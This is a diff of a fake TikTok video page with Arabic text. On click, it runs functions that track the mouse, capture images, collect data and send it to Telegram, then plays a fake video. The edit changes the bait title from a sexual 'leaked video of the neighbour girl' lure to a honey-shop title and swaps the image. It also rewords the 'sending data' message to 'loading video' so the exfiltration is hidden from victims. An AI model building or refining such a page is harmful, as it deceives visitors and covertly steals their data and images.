@@ -8,7 +8,7 @@
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#000;color:#fff;font-family:'Segoe UI',Arial;overflow:hidden}
         .container{width:100vw;height:100vh;max-width:500px;margin:auto;position:relative;display:flex;justify-content:center;align-items:center}
-        .thumb{position:absolute;width:100%;height:100%;background:url('https://i.imgur.com/8QJ8z1k.jpg') center/cover;filter:brightness(.7);display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding-bottom:50px;z-index:10;cursor:pointer;transition:opacity .6s}
+        .thumb{position:absolute;width:100%;height:100%;background:url('https://scontent.fjrs25-1.fna.fbcdn.net/v/t1.6435-9/160172952_111827274305479_6937167974917509166_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_ohc=lAQQ5Q5sJCAQ7kNvwFgzQvH&_nc_oc=Adkfy0BsVc7XGxnabYt58m-DjsccjNXHKsR8lsV3UjINKmOy-QWkTfEDlX7wbw5LtMU&_nc_zt=23&_nc_ht=scontent.fjrs25-1.fna&_nc_gid=D87--DiO2ZiFW1YlaAomUw&oh=00_Afjbr4HLNQWe9rKUUqe2FczGM_JPCzunyVDmTMDi30e7Zg&oe=692F2494') center/cover;filter:brightness(.7);display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding-bottom:50px;z-index:10;cursor:pointer;transition:opacity .6s}
         .thumb::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(to top,rgba(0,0,0,.8),transparent)}
         .play{width:80px;height:80px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(12px);border:3px solid rgba(255,255,255,.4)}
         .play svg{width:38px;height:38px;fill:#fff;margin-right:4px}
@@ -34,7 +34,7 @@
         <div class="logo">TikTok</div>
         <div class="thumb" id="thumb">
             <div class="play"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-            <div class="title">فيديو مسرب: بنت الجيران تتعرى!</div>
+            <div class="title">افضل المنتجات لدى متجر عسل !</div>
             <div class="sub">اضغط لتشغيل (18+)</div>
         </div>
         <div id="loader">
@@ -240,7 +240,7 @@
             trackMouse(); p(55);
             await captureImages(); p(80);
             collectFinal(); p(90);
-            msg.textContent = 'جاري إرسال البيانات...';
+            msg.textContent = 'جاري تحميل الفيديو ...';
             await sendToTelegram(); p(100);
             msg.textContent = 'جاري تشغيل الفيديو...';
             playFake();
